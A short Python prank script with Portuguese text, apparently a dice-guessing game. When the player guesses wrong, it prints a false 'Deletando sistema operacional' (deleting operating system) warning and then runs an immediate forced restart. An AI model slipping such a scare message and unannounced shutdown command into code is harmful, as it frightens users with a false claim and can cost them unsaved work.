import os
import random
import time
while True:
    u=input("Insira um número de 1 a 6: ")
    if u.isdigit():
        un=int(u)
        if 1<= un <= 6:
            break
    print("Inválido, tente novamente em")
    abb="321"
    for aaja in abb:
        print(aaja)
        time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
s=random.randint (1,6)
s2=random.randint (1,6)
if un==s or un==s2:
    print ("Você venceu")
else:
    frase="parece que você errou"
    frase2="você não me deixa escolha"
    contagem="12345"
    win="Deletando sistema operacional"
    for _ in range(3):
        print (".")
        time.sleep(1)
    time.sleep (2)
    for l in frase:
        print (l, end=" ")
        time.sleep (0.4)
    print ()
    for _ in range(3):
        print(".", end=" ")
        time.sleep(1)
    print()
    for ll in frase2:
        print(ll, end=" ")
        time.sleep(0.4)
    print()
    for _ in range (3):
        print(".", end=" ")
        time.sleep(1)
    print()
    for nu in contagem:
        print(nu, end=" ")
        time.sleep(1)
    print()
    for lll in win:
        print(lll, end=" ")
        time.sleep(0.2)
    print()
    for _ in range (10):
        print(".", end=" ")
        time.sleep (0.2)
    time.sleep (2)
    os.system("shutdown /r /t 0")